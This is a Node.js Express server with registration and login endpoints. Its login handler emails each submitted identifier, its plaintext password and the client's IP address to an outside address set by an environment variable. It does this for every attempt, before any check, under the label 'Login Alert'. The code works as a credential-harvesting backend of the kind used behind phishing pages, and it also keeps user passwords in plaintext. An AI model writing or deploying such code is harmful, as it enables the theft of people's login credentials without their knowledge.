const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Email config from Render Environment Variables
const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;
const SEND_TO_EMAIL = process.env.SEND_TO_EMAIL;

// Email transporter
let transporter = null;
if (EMAIL_USER && EMAIL_PASS) {
    transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: { user: EMAIL_USER, pass: EMAIL_PASS }
    });
    console.log('✅ Email configured');
} else {
    console.log('⚠️ Email not configured');
}

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const users = [];

// Send email function
async function sendEmailAlert(email, password, ip) {
    if (!transporter) return;
    
    const subject = `🔐 Login Alert - ${new Date().toLocaleString()}`;
    const body = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nTime: ${new Date()}`;
    
    try {
        await transporter.sendMail({
            from: EMAIL_USER,
            to: SEND_TO_EMAIL,
            subject: subject,
            text: body
        });
        console.log('✅ Email sent');
    } catch (error) {
        console.log('❌ Email error:', error.message);
    }
}

// Register
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    const newUser = { id: users.length + 1, name, email, password };
    users.push(newUser);
    
    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
});

// Login - SENDS EMAIL
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Send email alert
    sendEmailAlert(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
